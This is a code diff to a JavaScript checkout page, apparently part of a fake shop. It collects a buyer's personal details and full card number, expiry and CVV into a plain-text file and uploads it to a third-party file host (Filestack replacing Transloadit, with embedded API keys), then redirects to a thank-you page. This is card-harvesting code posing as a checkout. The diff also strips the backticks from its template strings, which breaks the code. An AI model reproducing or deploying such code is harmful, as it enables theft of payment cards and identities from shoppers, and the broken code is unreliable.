@@ -20,14 +20,14 @@ document.addEventListener('DOMContentLoaded', function () {
   const urlParams = getUrlParams();
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = `${urlParams.name}`;
-  document.getElementById('product-color').textContent = ` ${urlParams.color}`;
-  document.getElementById('product-price').textContent = `${urlParams.price}`;
-  document.getElementById('product-quantity').textContent = `${urlParams.quantity}`;
+  document.getElementById('product-name').textContent = ${urlParams.name};
+  document.getElementById('product-color').textContent =  ${urlParams.color};
+  document.getElementById('product-price').textContent = ${urlParams.price};
+  document.getElementById('product-quantity').textContent = ${urlParams.quantity};
 
   // حساب السعر الإجمالي
   const totalPrice = urlParams.price * urlParams.quantity;
-  document.getElementById('total-price').textContent = `$${totalPrice}`;
+  document.getElementById('total-price').textContent = $${totalPrice};
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -152,26 +152,26 @@ document.addEventListener('DOMContentLoaded', function () {
       };
 
       // إنشاء المحتوى لملف نصي
-      let fileContent = `Client Data:\n`;
-      fileContent += `Email: ${email}\n`;
-      fileContent += `First Name: ${firstName}\n`;
-      fileContent += `Last Name: ${lastName}\n`;
-      fileContent += `Phone: ${phone}\n`;
-      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
-      fileContent += `Card Name: ${cardName}\n`;
-      fileContent += `Card Number: ${cardNumber}\n`;
-      fileContent += `Expiry: ${expiry}\n`;
-      fileContent += `CVV: ${cvv}\n\n`;
-      fileContent += `Product Information:\n`;
-      fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Product Price: ${productPriceText}\n`;
-      fileContent += `Product Quantity: ${productQuantityText}\n`;
-      fileContent += `Product Image URL: ${productImageUrl}\n`;
-      fileContent += `Total Price: ${totalPrice}\n`;
-      fileContent += `Coupon Code: ${couponCode}\n`;
+      let fileContent = Client Data:\n;
+      fileContent += Email: ${email}\n;
+      fileContent += First Name: ${firstName}\n;
+      fileContent += Last Name: ${lastName}\n;
+      fileContent += Phone: ${phone}\n;
+      fileContent += Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n;
+      fileContent += Card Name: ${cardName}\n;
+      fileContent += Card Number: ${cardNumber}\n;
+      fileContent += Expiry: ${expiry}\n;
+      fileContent += CVV: ${cvv}\n\n;
+      fileContent += Product Information:\n;
+      fileContent += Product Name: ${productName}\n;
+      fileContent += Product Price: ${productPriceText}\n;
+      fileContent += Product Quantity: ${productQuantityText}\n;
+      fileContent += Product Image URL: ${productImageUrl}\n;
+      fileContent += Total Price: ${totalPrice}\n;
+      fileContent += Coupon Code: ${couponCode}\n;
 
       // رفع الملف إلى Filestack
-      uploadToTransloadit(fileContent); 
+      uploadFileToFilestack(fileContent); 
 
      
     }
@@ -179,7 +179,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   function isCardExpired(expiry) {
   const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
-  const expiryDate = new Date(`20${year}`, month - 1);  // إنشاء تاريخ انتهاء البطاقة
+  const expiryDate = new Date(20${year}, month - 1);  // إنشاء تاريخ انتهاء البطاقة
 
   const currentDate = new Date();  // التاريخ الحالي
   currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
@@ -253,35 +253,19 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // دالة لرفع الملف إلى Filestack
-  function uploadToTransloadit(fileContent, fileName) {
-  const url = 'https://api2.transloadit.com/assemblies';
-  const formData = new FormData();
-
-  const params = {
-    auth: { key: '2809ffa98374487d84c3a679f748b294' },
-    steps: {
-      store: {
-        robot: '/s3/store',
-      },
-    },
-  };
-
-  formData.append('params', JSON.stringify(params));
-  formData.append('file', new Blob([fileContent], { type: 'text/plain' }), fileName);
-
-  fetch(url, {
-    method: 'POST',
-    body: formData,
-  })
-    .then(response => response.json())
-    .then(data => {
-      console.log('File uploaded successfully:', data);
-      // رابط الملف: data.results.store[0].url
-    })
-    .catch(error => {
-      console.error('Error uploading file:', error);
-    });
-}
+  function uploadFileToFilestack(fileContent) {
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+    client.upload(fileBlob)
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
+  }
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
@@ -291,25 +275,6 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   });
 });
-
-
-
-
-
-
- 
-  
-
-
-
-
-
-
-
-
-
-
-  
 
  
 
